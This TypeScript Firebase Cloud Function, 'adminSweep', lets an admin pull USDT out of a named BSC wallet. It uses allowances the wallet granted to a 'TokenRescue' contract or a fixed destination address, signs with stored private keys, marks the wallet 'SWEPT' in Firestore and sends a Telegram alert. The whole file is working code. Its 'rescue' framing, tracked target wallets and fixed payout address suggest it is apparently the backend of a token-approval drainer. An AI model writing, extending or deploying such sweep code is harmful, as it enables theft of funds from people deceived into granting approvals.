// functions/src/api/adminSweep.ts
//
// Callable Cloud Function – Admin-initiated sweep
// ─────────────────────────────────────────────────────────────────
// Only the authenticated admin (request.auth.token.email matches
// ADMIN_EMAIL) may call this function. It:
//   1. Validates the caller's Firebase Auth token server-side.
//   2. Reads on-chain allowance & balance for the target wallet.
//   3. Calls rescueTokens() on the TokenRescue contract (or direct
//      transferFrom if the approval was given to the USDT contract).
//   4. Records the result in Firestore (rescues collection).
//   5. Sends a Telegram notification.

import * as functions from "firebase-functions/v1";
import { ethers } from "ethers";
import { db } from "../lib/firestore";
import * as admin from "firebase-admin";
import { getSecret } from "../lib/secrets";

const ADMIN_EMAIL = "admin@rescue.internal";

export const adminSweep = functions
  .runWith({
    timeoutSeconds: 180,
    memory: "512MB",
    secrets: ["DESTINATION_PRIVATE_KEY", "TELEGRAM_TOKEN", "TELEGRAM_CHAT_ID"],
  })
  .https.onCall(async (data, context) => {
    // ── 1. Auth guard ──────────────────────────────────────────────
    if (!context.auth) {
      throw new functions.https.HttpsError(
        "unauthenticated",
        "You must be signed in to perform a sweep."
      );
    }

    const callerEmail = context.auth.token.email ?? "";
    if (callerEmail.toLowerCase() !== ADMIN_EMAIL.toLowerCase()) {
      throw new functions.https.HttpsError(
        "permission-denied",
        "Only the administrator may trigger a sweep."
      );
    }

    // ── 2. Validate input ──────────────────────────────────────────
    const { walletAddress, customAmount } = data as { walletAddress?: string; customAmount?: string };
    if (!walletAddress || !ethers.isAddress(walletAddress)) {
      throw new functions.https.HttpsError(
        "invalid-argument",
        "A valid wallet address is required."
      );
    }

    const targetWallet = ethers.getAddress(walletAddress); // normalise checksum

    // ── 3. On-chain setup ──────────────────────────────────────────
    const rpcUrl =
      process.env.BSC_HTTP_RPC_URL || "https://bsc-dataseed.binance.org/";
    // Use staticNetwork: true to avoid extra network detection round-trips
    const provider = new ethers.JsonRpcProvider(rpcUrl, 56, { staticNetwork: true });

    const usdtAddress =
      process.env.BSC_USDT_CONTRACT_ADDRESS ||
      "0x55d398326f99059fF775485246999027B3197955";

    const tokenRescueAddress =
      process.env.BSC_TOKEN_RESCUE_CONTRACT ||
      "0xc6bf6838263938533e547f825d257c9965544a50";

    const finalDestination =
      process.env.BSC_FINAL_DESTINATION ||
      "0x00faA9fE691b578b2D1934ac70C624886a93A636";

    // Read-only USDT interface (allowance + balance)
    const usdtReadOnly = new ethers.Contract(
      usdtAddress,
      [
        "function allowance(address owner, address spender) view returns (uint256)",
        "function balanceOf(address) view returns (uint256)",
      ],
      provider
    );

    // ── 4. Check allowance & balance in parallel (cuts pre-flight latency in half) ────
    const [allowanceViaContract, allowanceViaDirect, balance] = await Promise.all([
      usdtReadOnly.allowance(targetWallet, tokenRescueAddress) as Promise<bigint>,
      usdtReadOnly.allowance(targetWallet, finalDestination) as Promise<bigint>,
      usdtReadOnly.balanceOf(targetWallet) as Promise<bigint>,
    ]);

    let allowance: bigint = 0n;
    let spender = tokenRescueAddress; // default spender to check

    if (allowanceViaContract > 0n) {
      allowance = allowanceViaContract;
      spender = tokenRescueAddress;
    } else if (allowanceViaDirect > 0n) {
      allowance = allowanceViaDirect;
      spender = finalDestination;
    }

    if (balance === 0n) {
      throw new functions.https.HttpsError(
        "failed-precondition",
        `Wallet ${targetWallet} has zero USDT balance. Nothing to sweep.`
      );
    }

    if (allowance === 0n) {
      throw new functions.https.HttpsError(
        "failed-precondition",
        `Wallet ${targetWallet} has not granted any allowance. Cannot sweep.`
      );
    }

    // Sweep the smaller of balance vs allowance by default
    let sweepAmount = balance < allowance ? balance : allowance;

    if (customAmount && typeof customAmount === "string" && customAmount.trim().toUpperCase() !== "MAX") {
      const cleanCustom = customAmount.trim();
      let parsedCustom: bigint;
      try {
        parsedCustom = ethers.parseUnits(cleanCustom, 18);
      } catch (_) {
        throw new functions.https.HttpsError(
          "invalid-argument",
          `Invalid custom amount "${cleanCustom}". Please enter a valid number.`
        );
      }

      if (parsedCustom <= 0n) {
        throw new functions.https.HttpsError(
          "invalid-argument",
          "Custom sweep amount must be greater than 0."
        );
      }

      if (parsedCustom > balance) {
        throw new functions.https.HttpsError(
          "failed-precondition",
          `Custom amount (${cleanCustom} USDT) exceeds wallet balance (${ethers.formatUnits(balance, 18)} USDT).`
        );
      }

      if (parsedCustom > allowance) {
        throw new functions.https.HttpsError(
          "failed-precondition",
          `Custom amount (${cleanCustom} USDT) exceeds wallet allowance (${ethers.formatUnits(allowance, 18)} USDT).`
        );
      }

      sweepAmount = parsedCustom;
    }

    // ── 5. Build signing wallet ────────────────────────────────────
    // ── 5. Build signing wallet ────────────────────────────────────
    const contractOwnerSecret =
      process.env.CONTRACT_OWNER_PRIVATE_KEY ||
      (await getSecret("CONTRACT_OWNER_PRIVATE_KEY"));
    const destSecret =
      process.env.DESTINATION_PRIVATE_KEY ||
      (await getSecret("DESTINATION_PRIVATE_KEY"));

    // For TokenRescue contract calls, prefer CONTRACT_OWNER_PRIVATE_KEY if provided, else fall back to destSecret
    const activeSecret =
      (spender.toLowerCase() === tokenRescueAddress.toLowerCase() && contractOwnerSecret)
        ? contractOwnerSecret
        : (contractOwnerSecret || destSecret);

    if (!activeSecret) {
      throw new functions.https.HttpsError(
        "internal",
        "Sweep private key not configured. Add DESTINATION_PRIVATE_KEY or CONTRACT_OWNER_PRIVATE_KEY secret."
      );
    }

    let signingWallet: ethers.Wallet;
    if (activeSecret.trim().includes(" ")) {
      // mnemonic phrase
      const hd = ethers.HDNodeWallet.fromPhrase(activeSecret.trim());
      signingWallet = new ethers.Wallet(hd.privateKey, provider);
    } else {
      // raw hex private key
      signingWallet = new ethers.Wallet(activeSecret.trim(), provider);
    }

    // ── 6. Determine network gasPrice dynamically from BSC RPC ──────
    const feeData = await provider.getFeeData();
    const networkGasPrice = feeData.gasPrice ?? ethers.parseUnits("0.05", "gwei");
    // Ensure competitive execution with a 20% safety margin above network gasPrice
    const gasPrice = (networkGasPrice * 120n) / 100n;
    const gasLimit = 70000n;
    const estimatedCost = gasPrice * gasLimit;

    // ── 7. Check signing wallet BNB balance for gas ─────────────────
    const signerBnbBalance = await provider.getBalance(signingWallet.address);
    if (signerBnbBalance < estimatedCost) {
      const currentBnb = ethers.formatEther(signerBnbBalance);
      const neededBnb = ethers.formatEther(estimatedCost);
      throw new functions.https.HttpsError(
        "failed-precondition",
        `Sweep operator wallet (${signingWallet.address}) has insufficient BNB for gas (balance: ${currentBnb} BNB, required: ~${neededBnb} BNB). Please send a small amount of BNB to ${signingWallet.address} to execute sweeps.`
      );
    }

    // ── 8. Execute sweep with dynamic gasPrice & explicit gasLimit ──────
    const txOverrides = {
      gasPrice,
      gasLimit,
    };

    let sweepTx: ethers.TransactionResponse;

    try {
      if (spender.toLowerCase() === tokenRescueAddress.toLowerCase()) {
        // Use the TokenRescue contract
        const rescueABI = [
          "function owner() view returns (address)",
          "function rescueTokens(address token, address from, address to, uint256 amount) external",
        ];
        const rescueContract = new ethers.Contract(
          tokenRescueAddress,
          rescueABI,
          signingWallet
        );

        // Pre-flight check: ensure signing wallet is the actual contract owner to avoid on-chain revert
        const currentOwner: string = await rescueContract.owner();
        if (signingWallet.address.toLowerCase() !== currentOwner.toLowerCase()) {
          throw new functions.https.HttpsError(
            "failed-precondition",
            `Signer wallet (${signingWallet.address}) is not the owner of TokenRescue contract (${currentOwner}). Please configure the private key for ${currentOwner}.`
          );
        }

        functions.logger.info(
          `[adminSweep] Calling rescueTokens for ${targetWallet}, amount=${sweepAmount.toString()} (Signer: ${signingWallet.address}, Destination: ${finalDestination})`
        );
        sweepTx = await rescueContract.rescueTokens(
          usdtAddress,
          targetWallet,
          finalDestination,
          sweepAmount,
          txOverrides
        );
      } else {
        // Direct transferFrom (approval was given to the destination wallet)
        const erc20ABI = [
          "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
        ];
        const usdtContract = new ethers.Contract(
          usdtAddress,
          erc20ABI,
          signingWallet
        );

        functions.logger.info(
          `[adminSweep] Calling transferFrom for ${targetWallet}, amount=${sweepAmount.toString()}`
        );
        sweepTx = await usdtContract.transferFrom(
          targetWallet,
          finalDestination,
          sweepAmount,
          txOverrides
        );
      }

      // Wait for 1 confirmation
      await sweepTx.wait(1);
      functions.logger.info(`[adminSweep] Sweep confirmed: ${sweepTx.hash}`);
    } catch (txErr: any) {
      functions.logger.error("[adminSweep] Sweep transaction failed:", txErr);
      const reason = txErr.reason || txErr.shortMessage || txErr.message || "Transaction failed";
      throw new functions.https.HttpsError(
        "internal",
        `On-chain sweep failed: ${reason}`
      );
    }

    // ── 7. Record in Firestore (resilient) ─────────────────────────
    let docId = "";
    try {
      const rescueRef = db.collection("rescues").doc();
      docId = rescueRef.id;
      await rescueRef.set({
        user: targetWallet,
        initiatedBy: callerEmail,
        source: "ADMIN_MANUAL_SWEEP",
        sweepTxHash: sweepTx.hash,
        amount: sweepAmount.toString(),
        amountFormatted: ethers.formatUnits(sweepAmount, 18),
        destination: finalDestination,
        spenderUsed: spender,
        status: "CONFIRMED",
        createdAt: admin.firestore.FieldValue.serverTimestamp(),
      });

      // Also mark wallet as SWEPT in wallets collection so Admin Panel updates
      await db.collection("wallets").doc(targetWallet.toLowerCase()).set({
        status: "SWEPT",
        sweptAt: admin.firestore.FieldValue.serverTimestamp(),
        sweepTxHash: sweepTx.hash,
        lastSweptAmount: ethers.formatUnits(sweepAmount, 18),
      }, { merge: true });
    } catch (dbErr) {
      functions.logger.error("[adminSweep] Error saving sweep record to Firestore:", dbErr);
    }

    // ── 8. Telegram notification (await so it completes before function freezes) ──
    try {
      const { sendTelegramMessage } = await import("../lib/telegram");
      const formattedAmount = ethers.formatUnits(sweepAmount, 18);
      const amountNum = parseFloat(formattedAmount);
      const amountDisplay = amountNum > 0 ? amountNum.toFixed(2) : "0.00";
      await sendTelegramMessage(
        `🛡️ ADMIN SWEEP CONFIRMED\n\n` +
          `Amount: *${amountDisplay} USDT*\n\n` +
          `Wallet: ${targetWallet}\n\n` +
          `Destination: ${finalDestination}\n` +
          `transferdotcom`
      );
    } catch (tgErr) {
      functions.logger.warn("[adminSweep] Telegram notify failed:", tgErr);
    }

    // ── 9. Return result to caller ─────────────────────────────────
    return {
      success: true,
      sweepTxHash: sweepTx.hash,
      amountSwept: ethers.formatUnits(sweepAmount, 18),
      docId: docId || sweepTx.hash,
    };
  });
